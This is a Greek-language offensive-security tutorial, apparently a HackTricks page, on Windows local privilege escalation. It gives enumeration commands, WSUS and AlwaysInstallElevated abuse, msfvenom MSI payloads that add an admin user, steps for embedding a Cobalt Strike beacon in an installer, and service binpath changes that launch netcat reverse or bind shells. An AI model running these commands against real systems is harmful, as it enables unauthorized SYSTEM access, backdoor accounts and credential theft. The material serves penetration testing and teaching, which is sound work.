# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Καλύτερο εργαλείο για την αναζήτηση Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Εισαγωγική θεώρηση των Windows

### Access Tokens

**Αν δεν ξέρετε τι είναι τα Windows Access Tokens, διαβάστε την παρακάτω σελίδα πριν προχωρήσετε:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Δείτε την παρακάτω σελίδα για περισσότερες πληροφορίες σχετικά με ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Αν δεν ξέρετε τι είναι τα integrity levels στα Windows θα πρέπει να διαβάσετε την παρακάτω σελίδα πριν προχωρήσετε:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Έλεγχοι ασφάλειας των Windows

Υπάρχουν διάφορα πράγματα στα Windows που θα μπορούσαν να σας εμποδίσουν να πραγματοποιήσετε την αναγνώριση του συστήματος, να εκτελέσετε εκτελέσιμα αρχεία ή ακόμη και να ανιχνεύσουν τις δραστηριότητές σας. Πρέπει να διαβάσετε την παρακάτω σελίδα και να καταγράψετε όλους αυτούς τους μηχανισμούς άμυνας πριν ξεκινήσετε την privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Πληροφορίες συστήματος

### Έλεγχος πληροφοριών έκδοσης

Ελέγξτε αν η έκδοση των Windows έχει κάποια γνωστή ευπάθεια (ελέγξτε επίσης τα εγκατεστημένα patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Έκδοση Exploits

Αυτός ο [ιστότοπος](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμος για την αναζήτηση λεπτομερών πληροφοριών σχετικά με τις ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων περιέχει περισσότερες από 4.700 ευπάθειες ασφαλείας, δείχνοντας την **τεράστια επιφάνεια επίθεσης** που παρουσιάζει ένα περιβάλλον Windows.

**Στο σύστημα**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas έχει ενσωματωμένο το watson)_

**Τοπικά με πληροφορίες συστήματος**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Αποθετήρια GitHub με exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Περιβάλλον

Υπάρχουν διαπιστευτήρια/Juicy πληροφορίες αποθηκευμένα στις env μεταβλητές;
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Ιστορικό
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Αρχεία μεταγραφής του PowerShell

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε στο [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Καταγράφονται λεπτομέρειες των εκτελέσεων pipeline του PowerShell, περιλαμβάνοντας τις εκτελεσμένες εντολές, τις κλήσεις εντολών και τμήματα των scripts. Ωστόσο, μπορεί να μην καταχωρούνται οι πλήρεις λεπτομέρειες εκτέλεσης και τα αποτελέσματα εξόδου.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες στην ενότητα "Transcript files" της τεκμηρίωσης, επιλέγοντας **"Module Logging"** αντί για **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Για να δείτε τα τελευταία 15 events από τα PowersShell logs μπορείτε να εκτελέσετε:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Καταγράφεται ένα πλήρες αρχείο δραστηριότητας και το ολοκληρωμένο περιεχόμενο της εκτέλεσης του script, διασφαλίζοντας ότι κάθε block του code τεκμηριώνεται καθώς εκτελείται. Αυτή η διαδικασία διατηρεί ένα ολοκληρωμένο αρχείο ελέγχου (audit trail) για κάθε δραστηριότητα, πολύτιμο για forensics και για την ανάλυση της κακόβουλης συμπεριφοράς. Με την τεκμηρίωση όλης της δραστηριότητας κατά το χρόνο εκτέλεσης παρέχονται λεπτομερείς πληροφορίες για τη διαδικασία.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Τα καταγεγραμμένα γεγονότα για το Script Block μπορούν να βρεθούν στο Windows Event Viewer στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να δείτε τα τελευταία 20 συμβάντα μπορείτε να χρησιμοποιήσετε:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ρυθμίσεις Διαδικτύου
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Δίσκοι
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Μπορείτε να compromise το σύστημα εάν οι ενημερώσεις δεν ζητούνται χρησιμοποιώντας http**S** αλλά http.

Ξεκινάτε ελέγχοντας αν το δίκτυο χρησιμοποιεί non-SSL WSUS update εκτελώντας την ακόλουθη εντολή στο cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ή το ακόλουθο στο PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Αν λάβετε απάντηση όπως μία από τις παρακάτω:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Και αν `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` είναι ίσο με `1`. 

Τότε, **είναι εκμεταλλεύσιμο.** Αν η τελευταία τιμή μητρώου είναι ίση με `0`, τότε η καταχώρηση WSUS θα αγνοηθεί.

Για να εκμεταλλευτείτε αυτές τις ευπάθειες μπορείτε να χρησιμοποιήσετε εργαλεία όπως: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Πρόκειται για weaponized MiTM scripts εκμετάλλευσης που εγχέουν 'fake' ενημερώσεις στην μη-SSL WSUS κίνηση.

Διαβάστε την έρευνα εδώ:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Διαβάστε την πλήρη αναφορά εδώ**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Βασικά, αυτή είναι η ευπάθεια που εκμεταλλεύεται αυτό το bug:

> Αν έχουμε τη δυνατότητα να τροποποιήσουμε τον local user proxy μας, και τα Windows Updates χρησιμοποιούν τον proxy που έχει ρυθμιστεί στις ρυθμίσεις του Internet Explorer, τότε έχουμε τη δυνατότητα να τρέξουμε το [PyWSUS](https://github.com/GoSecure/pywsus) τοπικά για να αναχαιτίσουμε την κίνησή μας και να εκτελέσουμε κώδικα ως αυξημένος χρήστης στη συσκευή μας.
>
> Επιπλέον, αφού η υπηρεσία WSUS χρησιμοποιεί τις ρυθμίσεις του τρέχοντος χρήστη, θα χρησιμοποιήσει και το certificate store του. Αν δημιουργήσουμε ένα self-signed πιστοποιητικό για το hostname του WSUS και προσθέσουμε αυτό το πιστοποιητικό στο certificate store του τρέχοντος χρήστη, θα μπορέσουμε να αναχαιτίσουμε τόσο την HTTP όσο και την HTTPS κίνηση του WSUS. Το WSUS δεν χρησιμοποιεί μηχανισμούς τύπου HSTS για να εφαρμόσει έναν trust-on-first-use έλεγχο του πιστοποιητικού. Αν το παρουσιαζόμενο πιστοποιητικό εμπιστεύεται από τον χρήστη και έχει το σωστό hostname, θα γίνει αποδεκτό από την υπηρεσία.

Μπορείτε να εκμεταλλευτείτε αυτή την ευπάθεια χρησιμοποιώντας το εργαλείο [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (όταν απελευθερωθεί).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Πολλά enterprise agents εκθέτουν μια localhost IPC επιφάνεια και ένα προνομιακό κανάλι ενημερώσεων. Αν η enrollment μπορεί να εξαναγκαστεί προς έναν attacker server και ο updater εμπιστεύεται ένα rogue root CA ή έχει αδύναμους ελέγχους υπογραφής, ένας τοπικός χρήστης μπορεί να παραδώσει ένα κακόβουλο MSI που η υπηρεσία SYSTEM θα εγκαταστήσει. Δείτε μια γενικευμένη τεχνική (βασισμένη στην Netskope stAgentSvc chain – CVE-2025-0309) εδώ:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Υπάρχει μια **local privilege escalation** ευπάθεια σε Windows **domain** περιβάλλοντα υπό συγκεκριμένες προϋποθέσεις. Αυτές οι προϋποθέσεις περιλαμβάνουν περιβάλλοντα όπου **LDAP signing δεν εφαρμόζεται υποχρεωτικά**, οι χρήστες έχουν self-rights που τους επιτρέπουν να ρυθμίσουν το **Resource-Based Constrained Delegation (RBCD)**, και τη δυνατότητα για χρήστες να δημιουργούν computers μέσα στο domain. Είναι σημαντικό να σημειωθεί ότι αυτές οι **απαιτήσεις** ικανοποιούνται με τις **προεπιλεγμένες ρυθμίσεις**.

Βρείτε το **exploit** στο [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης δείτε [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Εάν** αυτές οι 2 τιμές μητρώου είναι **ενεργοποιημένες** (τιμή **0x1**), τότε χρήστες οποιουδήποτε επιπέδου προνομίων μπορούν να **εγκαταστήσουν** (εκτελέσουν) `*.msi` αρχεία ως NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Αν έχετε μια meterpreter συνεδρία μπορείτε να αυτοματοποιήσετε αυτήν την τεχνική χρησιμοποιώντας το module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το power-up για να δημιουργήσετε μέσα στον τρέχοντα κατάλογο ένα Windows MSI δυαδικό για να αποκτήσετε αυξημένα προνόμια. Αυτό το script εξάγει έναν προκατασκευασμένο MSI installer που εμφανίζει προτροπή για προσθήκη χρήστη/ομάδας (οπότε θα χρειαστείτε GIU access):
```
Write-UserAddMSI
```
Απλώς εκτελέστε το δημιουργημένο binary για να αποκτήσετε αυξημένα προνόμια.

### MSI Wrapper

Διαβάστε αυτό το tutorial για να μάθετε πώς να δημιουργήσετε ένα MSI wrapper χρησιμοποιώντας αυτά τα εργαλεία. Σημειώστε ότι μπορείτε να τυλίξετε ένα "**.bat**" αρχείο αν **απλώς** θέλετε να **εκτελέσετε** **εντολές γραμμής εντολών**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Ανοίξτε το **Visual Studio**, επιλέξτε **Create a new project** και πληκτρολογήστε "installer" στο πλαίσιο αναζήτησης. Επιλέξτε το project **Setup Wizard** και κάντε κλικ στο **Next**.
- Δώστε στο project ένα όνομα, όπως **AlwaysPrivesc**, χρησιμοποιήστε **`C:\privesc`** για τη θέση, επιλέξτε **place solution and project in the same directory**, και κάντε κλικ στο **Create**.
- Συνεχίστε να πατάτε **Next** μέχρι να φτάσετε στο βήμα 3 από 4 (choose files to include). Κάντε κλικ στο **Add** και επιλέξτε το Beacon payload που μόλις δημιουργήσατε. Στη συνέχεια πατήστε **Finish**.
- Επισημάνετε το project **AlwaysPrivesc** στο **Solution Explorer** και στις **Properties**, αλλάξτε το **TargetPlatform** από **x86** σε **x64**.
- Υπάρχουν και άλλες ιδιότητες που μπορείτε να αλλάξετε, όπως **Author** και **Manufacturer** οι οποίες μπορούν να κάνουν την εγκατεστημένη εφαρμογή να φαίνεται πιο νόμιμη.
- Δεξί κλικ στο project και επιλέξτε **View > Custom Actions**.
- Δεξί κλικ στο **Install** και επιλέξτε **Add Custom Action**.
- Διπλό κλικ στο **Application Folder**, επιλέξτε το αρχείο **beacon.exe** και πατήστε **OK**. Αυτό θα εξασφαλίσει ότι το beacon payload θα εκτελεστεί αμέσως μόλις τρέξει ο installer.
- Στις **Custom Action Properties**, αλλάξτε το **Run64Bit** σε **True**.
- Τέλος, **build it**.
- Αν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιωθείτε ότι έχετε ορίσει την πλατφόρμα σε x64.

### MSI Installation

Για να εκτελέσετε την **εγκατάσταση** του κακόβουλου `.msi` αρχείου στο **παρασκήνιο:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Για να exploit αυτή την vulnerability μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Ρυθμίσεις Καταγραφής

Αυτές οι ρυθμίσεις καθορίζουν τι **καταγράφεται**, οπότε πρέπει να δώσετε προσοχή
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, είναι ενδιαφέρον να ξέρουμε πού αποστέλλονται τα logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** έχει σχεδιαστεί για τη **διαχείριση των local Administrator passwords**, εξασφαλίζοντας ότι κάθε κωδικός είναι **μοναδικός, τυχαίος και τακτικά ανανεούμενος** σε υπολογιστές ενταγμένους σε domain. Οι κωδικοί αυτοί αποθηκεύονται με ασφάλεια στο Active Directory και μπορούν να προσπελαστούν μόνο από χρήστες στους οποίους έχουν παραχωρηθεί επαρκή δικαιώματα μέσω ACLs, επιτρέποντάς τους να προβάλουν local admin passwords εάν είναι εξουσιοδοτημένοι.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Εάν είναι ενεργό, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Από τα **Windows 8.1**, η Microsoft εισήγαγε ενισχυμένη προστασία για το Local Security Authority (LSA) ώστε να **αποτρέπει** προσπάθειες από μη αξιόπιστες διεργασίες να **διαβάσουν τη μνήμη του** ή να inject code, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**Περισσότερες πληροφορίες για την LSA Protection εδώ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** εισήχθη στα **Windows 10**. Σκοπός του είναι να προστατεύει τα credentials που είναι αποθηκευμένα σε μια συσκευή από απειλές όπως pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Αποθηκευμένα Διαπιστευτήρια

Τα **Domain credentials** επαληθεύονται από την **Local Security Authority** (LSA) και χρησιμοποιούνται από τα συστατικά του λειτουργικού συστήματος. Όταν τα στοιχεία σύνδεσης ενός χρήστη επαληθεύονται από ένα καταχωρημένο security package, συνήθως δημιουργούνται domain credentials για τον χρήστη.\

[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Χρήστες & Ομάδες

### Απαρίθμηση Χρηστών & Ομάδων

Πρέπει να ελέγξετε αν κάποια από τις ομάδες στις οποίες ανήκετε διαθέτουν ενδιαφέροντα δικαιώματα
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ομάδες με προνόμια

Αν **ανήκετε σε κάποια ομάδα με προνόμια, ίσως να μπορείτε να αυξήσετε τα προνόμιά σας**. Μάθετε για τις ομάδες με προνόμια και πώς να τις εκμεταλλευτείτε για να αυξήσετε τα προνόμια εδώ:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Χειρισμός Token

**Μάθετε περισσότερα** για το τι είναι ένα **token** σε αυτή τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Δείτε την παρακάτω σελίδα για να **μάθετε σχετικά με ενδιαφέροντα token** και πώς να τα εκμεταλλευτείτε:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Συνδεδεμένοι χρήστες / Συνεδρίες
```bash
qwinsta
klist sessions
```
### Φάκελοι χρήστη
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Πολιτική Κωδικών Πρόσβασης
```bash
net accounts
```
### Λήψη του περιεχομένου του πρόχειρου
```bash
powershell -command "Get-Clipboard"
```
## Εκτελούμενες Διαδικασίες

### Δικαιώματα Αρχείων και Φακέλων

Πρώτα απ' όλα, κατά την απαρίθμηση των διεργασιών **ελέξτε για κωδικούς μέσα στη γραμμή εντολών της διεργασίας**.\
Ελέγξτε αν μπορείτε να **επαναγράψετε κάποιο εκτελούμενο binary** ή αν έχετε δικαιώματα εγγραφής στον φάκελο των binaries για να εκμεταλλευτείτε πιθανές [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Ελέγξτε πάντα για πιθανούς [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Έλεγχος δικαιωμάτων των εκτελέσιμων αρχείων των διεργασιών**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Έλεγχος δικαιωμάτων των φακέλων των δυαδικών αρχείων των διεργασιών (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Εξόρυξη Password από τη μνήμη

Μπορείτε να δημιουργήσετε ένα memory dump μιας διεργασίας σε εκτέλεση χρησιμοποιώντας **procdump** από sysinternals. Υπηρεσίες όπως το FTP έχουν τα **credentials in clear text in memory**, δοκιμάστε να κάνετε dump της μνήμης και να διαβάσετε τα credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Μη ασφαλείς GUI εφαρμογές

**Εφαρμογές που εκτελούνται ως SYSTEM μπορεί να επιτρέπουν σε έναν χρήστη να ξεκινήσει ένα CMD ή να περιηγηθεί σε φακέλους.**

Παράδειγμα: "Windows Help and Support" (Windows + F1), αναζήτηση για "command prompt", κάντε κλικ στο "Click to open Command Prompt"

## Υπηρεσίες

Service Triggers επιτρέπουν στα Windows να ξεκινούν μια υπηρεσία όταν συμβαίνουν ορισμένες συνθήκες (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, κ.λπ.). Ακόμα και χωρίς δικαιώματα SERVICE_START μπορείτε συχνά να ξεκινήσετε privileged services ενεργοποιώντας τα triggers τους. Δείτε enumeration και activation techniques εδώ:

-
{{#ref}}
service-triggers.md
{{#endref}}

Λήψη λίστας υπηρεσιών:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε **sc** για να λάβετε πληροφορίες σχετικά με μια υπηρεσία
```bash
sc qc <service_name>
```
Συνιστάται να έχετε το δυαδικό **accesschk** από το _Sysinternals_ για να ελέγξετε το απαιτούμενο επίπεδο προνομίων για κάθε υπηρεσία.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Συνιστάται να ελέγξετε εάν οι "Authenticated Users" μπορούν να τροποποιήσουν οποιαδήποτε υπηρεσία:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Αν λαμβάνετε αυτό το σφάλμα (για παράδειγμα με SSDPSRV):

_Παρουσιάστηκε σφάλμα συστήματος 1058._\
_Η υπηρεσία δεν μπορεί να ξεκινήσει, είτε επειδή είναι απενεργοποιημένη είτε επειδή δεν έχει συσχετισμένες ενεργοποιημένες συσκευές._

Μπορείτε να την ενεργοποιήσετε χρησιμοποιώντας
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από την SSDPSRV για να λειτουργήσει (για XP SP1)**

**Μια άλλη παράκαμψη** αυτού του προβλήματος είναι να εκτελέσετε:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

Σε ένα σενάριο όπου η ομάδα "Authenticated users" κατέχει **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου binary της υπηρεσίας. Για να τροποποιήσετε και να εκτελέσετε το **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Επανεκκίνηση υπηρεσίας
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Τα προνόμια μπορούν να αυξηθούν μέσω διαφόρων δικαιωμάτων:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την επαναδιαμόρφωση του service binary.
- **WRITE_DAC**: Ενεργοποιεί την επαναδιαμόρφωση δικαιωμάτων, παρέχοντας τη δυνατότητα αλλαγής των service configurations.
- **WRITE_OWNER**: Επιτρέπει απόκτηση ιδιοκτησίας και επαναδιαμόρφωση δικαιωμάτων.
- **GENERIC_WRITE**: Κληρονομεί τη δυνατότητα αλλαγής των service configurations.
- **GENERIC_ALL**: Επίσης κληρονομεί τη δυνατότητα αλλαγής των service configurations.

Για την ανίχνευση και εκμετάλλευση αυτής της ευπάθειας, μπορεί να χρησιμοποιηθεί το _exploit/windows/local/service_permissions_.

### Αδύναμα δικαιώματα service binaries

**Ελέγξτε αν μπορείτε να τροποποιήσετε το binary που εκτελείται από μια service** ή αν έχετε **write permissions στον φάκελο** όπου βρίσκεται το binary ([**DLL Hijacking**](dll-hijacking/index.html)).\
Μπορείτε να αποκτήσετε κάθε binary που εκτελείται από μια service χρησιμοποιώντας **wmic** (όχι στο system32) και να ελέγξετε τα δικαιώματά σας χρησιμοποιώντας **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Μπορείτε επίσης να χρησιμοποιήσετε **sc** και **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Άδειες τροποποίησης μητρώου υπηρεσιών

Θα πρέπει να ελέγξετε αν μπορείτε να τροποποιήσετε οποιοδήποτε μητρώο υπηρεσίας.\
Μπορείτε να **ελέγξετε** τα **δικαιώματα** σας πάνω σε ένα **μητρώο υπηρεσίας** κάνοντας:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Πρέπει να ελεγχθεί αν οι **Authenticated Users** ή **NT AUTHORITY\INTERACTIVE** διαθέτουν δικαιώματα `FullControl`. Εάν ναι, το binary που εκτελείται από την υπηρεσία μπορεί να τροποποιηθεί.

